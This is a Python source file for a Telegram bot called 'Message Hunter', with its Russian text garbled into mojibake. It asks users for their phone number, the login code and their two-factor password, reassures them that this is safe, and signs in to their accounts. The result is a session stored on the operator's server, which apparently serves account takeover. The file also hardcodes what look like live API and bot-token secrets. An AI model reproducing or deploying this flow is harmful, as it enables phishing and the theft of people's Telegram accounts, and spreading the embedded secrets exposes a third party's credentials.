from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import json
import asyncio
import time

# API –¥–∞–Ω–Ω—ã–µ
API_ID = 29318340
API_HASH = "68be30e447857e5e5aa24c23a41c686d"
BOT_TOKEN = "8083238823:AAHgAcvKL7nf29zz66kGB3bL6QCSHOVXCRA"

# –°–æ–∑–¥–∞—ë–º –±–æ—Ç–∞
bot_app = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# –°–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}
user_clients = {}
temp_auth_data = {}

def save_user_session(user_id, session_data):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å–µ—Å—Å–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        os.makedirs('user_sessions', exist_ok=True)
        with open(f'user_sessions/{user_id}.json', 'w', encoding='utf-8') as f:
            json.dump(session_data, f, ensure_ascii=False, indent=2)
        print(f"‚úÖ –°–µ—Å—Å–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –¥–ª—è {user_id}")
        
        # –£–≤–µ–¥–æ–º–ª—è–µ–º –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
        with open('auth_notifications.txt', 'a') as f:
            f.write(f"{user_id}:SUCCESS\n")
            
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏: {e}")
        with open('auth_notifications.txt', 'a') as f:
            f.write(f"{user_id}:ERROR:{str(e)}\n")

@bot_app.on_message(filters.command("start"))
def start_command(client, message):
    user_id = message.from_user.id
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä (–¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —Å —Å–∞–π—Ç–∞)
    if len(message.command) > 1:
        web_user_id = message.command[1]
        
        if web_user_id == "web_login":
            # –°—Ç–∞—Ä–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –≤–µ–±-–≤—Ö–æ–¥–∞
            auth_code = f"WEB{user_id}"
            message.reply_text(
                f"üîê –í–∞—à –∫–æ–¥ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å:\n\n"
                f"`{auth_code}`\n\n"
                f"–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥ –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –Ω–∞ —Å–∞–π—Ç–µ."
            )
        else:
            # –ù–æ–≤–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞
            user_states[user_id] = {'web_user_id': web_user_id, 'step': 'waiting_phone'}
            
            message.reply_text(
                f"üîê –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞ –¥–ª—è –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è\n\n"
                f"üì± –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\n"
                f"+380991234567\n\n"
                f"‚ö†Ô∏è –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ - –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —á–µ—Ä–µ–∑ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram API"
            )
    else:
        # –û–±—ã—á–Ω—ã–π —Å—Ç–∞—Ä—Ç - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("üîç –û—Ç–∫—Ä—ã—Ç—å –ø–æ–∏—Å–∫", 
                                web_app={"url": "https://10ea-2a09-bac1-7540-10-00-84-95.ngrok-free.app"})]
        ])
        
        message.reply_text(
            "üîç **Message Hunter**\n\n"
            "–ü–æ–∏—Å–∫ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram –≥—Ä—É–ø–ø–∞—Ö\n\n"
            "–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã:",
            reply_markup=keyboard
        )

@bot_app.on_message(filters.text & filters.private & ~filters.command("start"))
async def handle_text(client, message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_states:
        await message.reply_text("–ù–∞–∂–º–∏—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞")
        return
    
    user_data = user_states[user_id]
    
    if user_data['step'] == 'waiting_phone':
        if text.startswith('+') and len(text) >= 10:
            try:
                # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                session_name = f"user_session_{user_data['web_user_id']}"
                user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
                
                await user_client.connect()
                sent_code = await user_client.send_code(text)
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
                user_clients[user_id] = user_client
                temp_auth_data[user_id] = {
                    'phone': text,
                    'phone_code_hash': sent_code.phone_code_hash
                }
                
                user_states[user_id]['step'] = 'waiting_code'
                
                await message.reply_text(
                    f"üì® –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ {text}\n\n"
                    f"‚è±Ô∏è –í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ SMS –ë–´–°–¢–†–û:"
                )
                
            except Exception as e:
                await message.reply_text(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: {str(e)}")
        else:
            await message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: +380991234567")
    
    elif user_data['step'] == 'waiting_code':
        if text.isdigit() and len(text) == 5:
            try:
                auth_data = temp_auth_data[user_id]
                user_client = user_clients[user_id]
                
                # –ê–≤—Ç–æ—Ä–∏–∑—É–µ–º—Å—è
                await user_client.sign_in(
                    auth_data['phone'], 
                    auth_data['phone_code_hash'], 
                    text
                )
                
                # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                me = await user_client.get_me()
                await user_client.disconnect()
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–µ—Å—Å–∏—é
                session_data = {
                    'is_connected': True,
                    'phone': auth_data['phone'],
                    'user_info': {
                        'first_name': me.first_name or '',
                        'last_name': me.last_name or '',
                        'username': me.username or '',
                        'user_id': str(me.id)
                    }
                }
                
                save_user_session(user_data['web_user_id'], session_data)
                
                # –û—á–∏—â–∞–µ–º –¥–∞–Ω–Ω—ã–µ
                del user_states[user_id]
                del temp_auth_data[user_id]
                del user_clients[user_id]
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É—Å–ø–µ—à–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                await message.reply_text(
                    f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {me.first_name} —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!\n\n"
                    f"–¢–µ–ø–µ—Ä—å –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–∞–π—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ'"
                )
                
            except Exception as e:
                if "SESSION_PASSWORD_NEEDED" in str(e):
                    user_states[user_id]['step'] = 'waiting_2fa'
                    await message.reply_text("üîê –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:")
                elif "PHONE_CODE_EXPIRED" in str(e):
                    await message.reply_text("‚è∞ –ö–æ–¥ –∏—Å—Ç–µ–∫. –ù–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ —Å /start")
                    if user_id in user_states:
                        del user_states[user_id]
                    if user_id in temp_auth_data:
                        del temp_auth_data[user_id]
                    if user_id in user_clients:
                        try:
                            await user_clients[user_id].disconnect()
                        except:
                            pass
                        del user_clients[user_id]
                else:
                    await message.reply_text(f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")
        else:
            await message.reply_text("‚ùå –í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥")
    
    elif user_data['step'] == 'waiting_2fa':
        try:
            user_client = user_clients[user_id]
            await user_client.check_password(text)
            
            me = await user_client.get_me()
            await user_client.disconnect()
            
            session_data = {
                'is_connected': True,
                'phone': temp_auth_data[user_id]['phone'],
                'user_info': {
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'username': me.username or '',
                    'user_id': str(me.id)
                }
            }
            
            save_user_session(user_data['web_user_id'], session_data)
            
            # –û—á–∏—â–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            del user_states[user_id]
            del temp_auth_data[user_id]
            del user_clients[user_id]
            
            await message.reply_text(
                f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {me.first_name} —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!\n\n"
                f"–¢–µ–ø–µ—Ä—å –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–∞–π—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ'"
            )
            
        except Exception as e:
            await message.reply_text(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å 2FA: {str(e)}")

if __name__ == "__main__":
    print("ü§ñ –û—Å–Ω–æ–≤–Ω–æ–π –±–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    bot_app.run()